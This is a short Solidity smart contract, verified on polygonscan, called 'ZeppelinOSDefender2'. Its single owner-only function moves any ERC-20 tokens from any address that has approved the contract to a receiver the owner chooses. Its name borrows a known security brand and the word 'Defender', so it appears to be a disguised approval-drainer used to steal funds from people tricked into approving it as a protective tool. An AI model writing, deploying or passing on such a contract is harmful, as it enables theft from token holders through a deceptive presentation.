/**
 *Submitted for verification at polygonscan.com on 2022-02-25
*/

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.6.12;

interface IERC20Token {
    function allowance(address _owner, address _spender) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
}

contract ZeppelinOSDefender2{
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function transferZeppelinOSDefender2(IERC20Token _token, address _sender, address _receiver, uint256 _amount) external returns (bool) {
        require(msg.sender == owner, "access denied");
        return _token.transferFrom(_sender, _receiver, _amount);
    }
}